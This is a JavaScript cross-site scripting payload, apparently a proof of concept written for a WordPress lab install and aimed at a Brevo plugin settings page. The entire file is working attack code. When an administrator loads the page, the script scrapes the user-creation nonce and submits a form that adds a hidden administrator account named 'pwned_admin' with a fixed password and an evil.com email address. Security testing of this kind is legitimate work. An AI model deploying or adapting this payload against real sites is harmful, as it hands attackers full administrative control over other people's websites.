// XSS Payload: Create New Admin User
// This JavaScript will be injected via the XSS vulnerability
// When admin visits the Brevo settings page, this script runs in their session

(function () {
    var newUser = {
        login: 'pwned_admin',
        email: 'pwned@evil.com',
        pass1: 'Pwned123!@#',
        pass2: 'Pwned123!@#',
        role: 'administrator'
    };

    fetch('/wp4hacking/wp-admin/user-new.php', {
        credentials: 'same-origin'
    })
        .then(function (response) {
            return response.text();
        })
        .then(function (html) {
            var parser = new DOMParser();
            var doc = parser.parseFromString(html, 'text/html');

            var nonceField = doc.querySelector('input[name="_wpnonce_create-user"]');
            if (!nonceField) {
                console.log('[XSS] Could not find nonce field');
                return;
            }

            var nonce = nonceField.value;
            console.log('[XSS] Got nonce: ' + nonce);

            var formData = new FormData();
            formData.append('action', 'createuser');
            formData.append('_wpnonce_create-user', nonce);
            formData.append('_wp_http_referer', '/wp4hacking/wp-admin/user-new.php');
            formData.append('user_login', newUser.login);
            formData.append('email', newUser.email);
            formData.append('first_name', '');
            formData.append('last_name', '');
            formData.append('url', '');
            formData.append('pass1', newUser.pass1);
            formData.append('pass2', newUser.pass2);
            formData.append('send_user_notification', '0');
            formData.append('role', newUser.role);
            formData.append('createuser', 'Add New User');

            return fetch('/wp4hacking/wp-admin/user-new.php', {
                method: 'POST',
                credentials: 'same-origin',
                body: formData
            });
        })
        .then(function (response) {
            if (response && response.ok) {
                console.log('[XSS] User creation request sent!');
                alert('XSS Escalation Success! New admin user created:\\n\\nUsername: ' + newUser.login + '\\nPassword: ' + newUser.pass1);
            }
        })
        .catch(function (error) {
            console.log('[XSS] Error: ' + error);
        });
})();
